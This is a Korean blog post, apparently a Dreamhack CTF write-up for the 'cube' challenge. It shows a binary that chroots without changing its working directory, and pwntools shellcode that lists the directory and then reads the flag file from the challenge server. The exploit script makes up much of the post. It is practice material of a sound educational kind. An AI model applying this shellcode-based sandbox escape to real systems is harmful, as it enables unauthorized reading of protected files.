---
title: "[DREAMHACK] cube writeup"
date: 2026-01-10 23:49:28
categories: Essay
tags: [writeup]
---

빠르게 분석해보겠습니다.
전에 풀었던 `STB-sandbox`에서 머리가 깨져서 그런가, 동아리 성과 발표회 시간때 5분 투자해서 바로 풀어버렸습니다 ㅋㅋ

# 보호기법 / 코드분석
```
pwndbg> i fu
All defined functions:

Non-debugging symbols:
...
0x00000000000007da  init
0x000000000000081d  sandbox
0x0000000000000830  main
...
pwndbg> pwn checksec ./cube
[*] '/home/bankai/Documents/for_backup/ptm/cube/cube'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/8a436ecf16ebc4adc1114f1b85934e091de6fce4946090796bc39b5950ac9a29.png)

`init()`은 워게임과 관련된 설정이고,


![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/45e37b8e9cf8322bde18e2883d82b82156df69810d554dc1415cbdf080af223b.png)
```
pwndbg> x/s 0x944
0x944:	"/home/cube/cube_box"
```

`chroot("/home/cube/cube_box")`가 호출되는 것을 볼 수 있습니다.
이제 `root 디렉터리`는 `'/home/cube/cube_box'`가 되었습니다.

먼저, 현재 디렉터리에 무엇이 있는지 확인하기 위해 `getdents()`를 쉘코드에 넣어 사용해보겠습니다.
```
# testing
context.arch = 'amd64'
sc = shellcraft.open('.')
sc += shellcraft.getdents('rax', 'rsp', 0x100)
sc += write(1, 'rsp', 'rax') # 읽은 만큼만(rax)
```
다음과 같이 작성해서 사용하면
```
    00000000  f9 01 00 00  00 00 00 00  0e 41 98 f8  b2 fe f7 57  │····│····│·A··│···W│
    00000010  18 00 63 75  62 65 00 08  20 00 00 00  00 00 00 00  │··cu│be··│ ···│····│
    00000020  1b f4 d4 14  1f 61 ff 5c  18 00 2e 2e  00 7f 00 04  │····│·a·\│··..│····│
    00000030  fa 01 00 00  00 00 00 00  75 31 f9 18  22 3b 44 77  │····│····│u1··│";Dw│
    00000040  18 00 66 6c  61 67 00 08  6e 00 00 00  00 00 00 00  │··fl│ag··│n···│····│
    00000050  10 86 99 8c  cf c2 93 7c  18 00 2e 00  19 c8 60 04  │····│···|│··.·│··`·│
    00000060  6f 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff 7f  │o···│····│····│····│
    00000070  20 00 63 75  62 65 5f 62  6f 78 00 00  00 00 00 04  │ ·cu│be_b│ox··│····│
    00000080  8b 9d bc bc  6f ad 55 d1  8b 9d 22 9c  9d 19 f7 d1  │····│o·U·│··"·│····│
```

...벌써 답이 보입니다.
`cwd`는 변경되지 않았고, `root`만 바뀐 상황인 것 같습니다.
이제 `orw shellcode`를 작성하겠습니다.

``` python
from pwn import *

HOST, PORT = 'host8.dreamhack.games 21454'.split()

# Ez

context.log_level = 'debug'
context.arch = 'amd64'

#sc = shellcraft.chdir('cube') # '..', '.'
sc = shellcraft.open('flag') # flag
sc += shellcraft.read('rax', 'rsp', 200)
#sc += shellcraft.getdents('rax', 'rsp', 0x200)
sc += shellcraft.write(1, 'rsp', 0x200)

r = remote(HOST, PORT)
r.sendafter(b'Give me shellcode: ', asm(sc))

#out = r.recvall()
#print(hexdump(out))

r.interactive()
```

처음에 의심스럽다 생각해서 여기저기 돌아다녔습니다..
이건 세상에서 가장 쓸모없는 삽질 중 하나에 들어가지 않을까요